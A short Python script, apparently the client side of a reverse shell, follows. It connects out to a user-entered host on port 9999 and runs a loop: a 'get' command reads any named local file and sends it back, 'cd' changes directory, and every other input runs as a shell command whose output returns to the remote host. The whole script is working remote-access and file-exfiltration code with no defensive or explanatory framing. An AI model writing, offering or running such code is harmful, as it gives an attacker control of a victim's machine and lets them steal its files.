import os
import socket
import subprocess
ip = raw_input("enter host: ")
s = socket.socket()
host = ip
port = 9999
s.connect((host,port))

while True:
	data = s.recv(1024)
	# print "-------"+data+"-------"

	if data[:3].decode("utf-8") == 'get':
		file = data[4:].decode("utf-8")
		print file
		f = open(file,'r')
		x = f.read()
		s.send(x)
			# while True:
			# 	l = f.read(1024)
			# 	while (l):
			# 		s.send(l)
			# 		print('Sent ',repr(l))
			# 		l = f.read(1024)
			# 	if not l:
			# 		f.close()
			# 		break
	elif data[:2].decode("utf-8") == 'cd':
		os.chdir(data[3:].decode("utf-8"))
	elif len(data) > 0:
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes)
		s.send(str.encode(output_str+str(os.getcwd())+ '>'))
		print(output_str)





s.close()